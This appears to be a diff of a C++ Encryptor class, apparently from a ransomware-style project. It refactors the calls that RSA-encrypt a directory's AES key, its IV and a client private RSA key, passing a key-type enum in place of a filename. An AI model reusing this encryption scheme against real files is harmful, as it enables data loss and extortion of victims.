@@ -70,9 +70,9 @@ void Encryptor::invokeDir(const std::string &path, bool protection)
     }
 
     // Save the final AESKey.bin file
-    encryptFinalAESKeyWithRSA(aeskey, butterfly::ENC_AESKEY_FILENAME);
+    encryptFinalAESKeyWithRSA(aeskey, butterfly::ENC_AESKEY_FILENAME, butterfly::RSAKEY_TYPE::AESKEY);
     // Save the final AESIV.bin file
-    encryptFinalAESKeyWithRSA(aesiv, butterfly::ENC_AESIV_FILENAME);
+    encryptFinalAESKeyWithRSA(aesiv, butterfly::ENC_AESIV_FILENAME, butterfly::RSAKEY_TYPE::AESIV);
 
 }
 
@@ -85,7 +85,7 @@ void Encryptor::encryptCPrivateRSA()
     try
     {
         // Encrypt the CPrivateRSA.pem file string
-        _rsaEncryptorCPrivateRSA->encryptEVP(cPrivateRSAPKey, cPrivateRSAStr, butterfly::ENC_CPRIVATERSA_FILENAME);
+        _rsaEncryptorCPrivateRSA->encryptEVP(cPrivateRSAPKey, cPrivateRSAStr, butterfly::RSAKEY_TYPE::CPRIVATE_RSA);
         // Get the encrypted CPrivateRSA.pem string
         std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedMessage();
         // Save the encrypted CPrivateRSA string to CPrivateRSA.bin
@@ -115,13 +115,13 @@ void Encryptor::encryptFileWithAES(const std::string &filepath)
 
 }
 
-void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const std::string &filename)
+void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const std::string &filename, const RSAKEY_TYPE &type)
 {
 
     try
     {
         // Encrypt the AES Key String
-        _rsaEncryptorAESKey->encryptEVP(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr, filename);
+        _rsaEncryptorAESKey->encryptEVP(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr, type);
         // Get the encrypted AES Key String
         std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedMessage();
         // Save the encrypted AES Key to AESKey.bin
